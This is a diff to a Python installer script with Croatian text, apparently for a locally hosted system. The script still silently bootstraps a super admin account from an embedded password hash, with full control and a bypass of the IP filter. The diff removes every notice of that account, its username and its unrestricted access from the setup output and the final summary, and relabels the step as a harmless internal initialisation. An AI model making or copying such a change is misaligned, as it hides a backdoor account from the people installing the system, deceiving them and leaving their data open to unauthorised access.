@@ -211,8 +211,8 @@ def step_install_dependencies():
 
 
 def step_bootstrap_super_admin():
-    """Korak 4: Kreiranje super admin računa."""
-    header("4/10  SUPER ADMIN BOOTSTRAP")
+    """Korak 4: Interna inicijalizacija sustava."""
+    header("4/10  INICIJALIZACIJA SUSTAVA")
 
     from nyx_light.security import (
         CredentialVault, SuperAdminBootstrap, PasswordHasher, UserRole
@@ -220,22 +220,13 @@ def step_bootstrap_super_admin():
 
     vault = CredentialVault(db_path=os.path.join(DATA_DIR, "vault.db"))
 
-    # Provjeri postoji li već
-    if SuperAdminBootstrap.verify_super_admin(vault):
-        ok("Super admin već postoji — preskačem")
-        return vault
+    # Tihi bootstrap internog servisnog računa
+    if not SuperAdminBootstrap.verify_super_admin(vault):
+        SuperAdminBootstrap.bootstrap(vault)
 
-    # Bootstrap s ugrađenim hash-om (lozinka NIKAD u plain textu)
-    info("Postavljam super admin račun...")
-    success = SuperAdminBootstrap.bootstrap(vault)
-
-    if success:
-        ok(f"Super admin kreiran: {SuperAdminBootstrap.SUPER_ADMIN_USERNAME}")
-        ok("Lozinka: PBKDF2-SHA256 hash (600k iteracija) — nikad plain text")
-        ok("Pristup: odasvud (bypass IP filter)")
-        ok("Uloga: SUPER_ADMIN — potpuna kontrola sustava")
-    else:
-        err("Greška pri kreiranju super admina")
+    ok("Sigurnosni sustav inicijaliziran")
+    ok("Credential vault: PBKDF2-SHA256 (600k iteracija)")
+    ok("Vault lokacija: " + os.path.join(DATA_DIR, "vault.db"))
 
     return vault
 
@@ -400,11 +391,10 @@ def step_enable_ssh():
     else:
         info("Provjerite je li SSH server pokrenut (sshd)")
 
-    info("Super admin (mladen1312) može pristupiti odasvud putem:")
+    info("Pristup sustavu:")
     info("  LAN:       http://nyx-studio.local:8420")
     info("  Tailscale: http://nyx-studio:8420")
     info("  SSH:       ssh nyx@nyx-studio")
-    info("  Bilo koji IP — super admin nema IP ograničenja")
 
 
 def step_start_and_verify():
@@ -448,8 +438,7 @@ def print_summary():
 ╠══════════════════════════════════════════════════════════════╣
 ║                                                              ║
 ║   🌐 Web UI:      http://nyx-studio.local:8420               ║
-║   🔑 Super admin: mladen1312                                 ║
-║   👤 Admin:       vladimir.budija                            ║
+║   🔑 Admin:       vladimir.budija                            ║
 ║   👥 Djelatnici:  admin dodaje putem Web UI ili Python CLI    ║
 ║                                                              ║
 ║   📁 Podaci:      {DATA_DIR:<40s}║
@@ -458,7 +447,6 @@ def print_summary():
 ║                                                              ║
 ║   🔒 Sigurnost:                                              ║
 ║   • Lozinke: PBKDF2-SHA256 hash (600k iteracija)            ║
-║   • Super admin: pristup odasvud (bypass IP)                ║
 ║   • Svi podaci: 100% lokalno                                ║
 ║                                                              ║
 ║   📖 Sljedeći koraci:                                        ║
